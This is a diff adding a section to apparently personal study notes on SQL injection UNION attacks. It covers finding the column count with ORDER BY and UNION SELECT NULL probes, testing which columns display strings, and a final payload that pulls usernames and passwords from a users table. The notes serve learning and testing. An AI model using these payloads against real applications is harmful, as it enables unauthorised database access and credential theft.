@@ -98,3 +98,88 @@ Password check is ignored.
 Hence its by passed.
 
 ---
+
+## 🔓 SQL Injection – UNION Attack
+
+🎯 What is UNION in SQL?
+
+The UNION operator allows combining results from two or more SELECT queries into a single result set.
+
+```sql
+SELECT a, b FROM table1
+UNION
+SELECT c, d FROM table2
+```
+Result: Two columns, merged rows from both SELECT statements.
+
+Conditions:
+
+- Same number of columns in both queries.
+
+- Compatible data types between corresponding columns.
+
+---
+
+## 🔍 Determining the Number of Columns
+
+Two main techniques:
+
+1. ORDER BY Injection
+
+Gradually increase the column index:
+```sql
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+...
+```
+
+When the index exceeds the number of columns, the server returns an error (e.g., “ORDER BY position 4 is out of range”).
+
+This helps identify the total number of columns.
+
+2. UNION SELECT NULL
+
+Try increasing NULL values until the query works:
+
+```sql
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+...
+````
+
+If it works with 3 NULLs, then 3 columns are returned by the original query.
+
+NULL is type-flexible, so it's the safest value to test with.
+
+---
+
+## 🧠 Finding Columns That Accept Strings
+
+Once the correct column count is known, inject strings to find displayable columns:
+```sql
+' UNION SELECT 'a',NULL,NULL--
+' UNION SELECT NULL,'a',NULL--
+' UNION SELECT NULL,NULL,'a'--
+````
+Whichever payload reflects 'a' back confirms which column is rendered in the output.
+
+This is crucial to display useful data like usernames, emails, passwords, etc.
+
+---
+
+## 💥 Retrieving Sensitive Data
+
+After knowing:
+
+- Number of columns
+
+- Which column outputs data
+
+You can extract data from other tables like users:
+
+```sql
+' UNION SELECT username, password, NULL FROM users--
+(Assuming 3 columns total and 3rd isn’t displayed)
+```
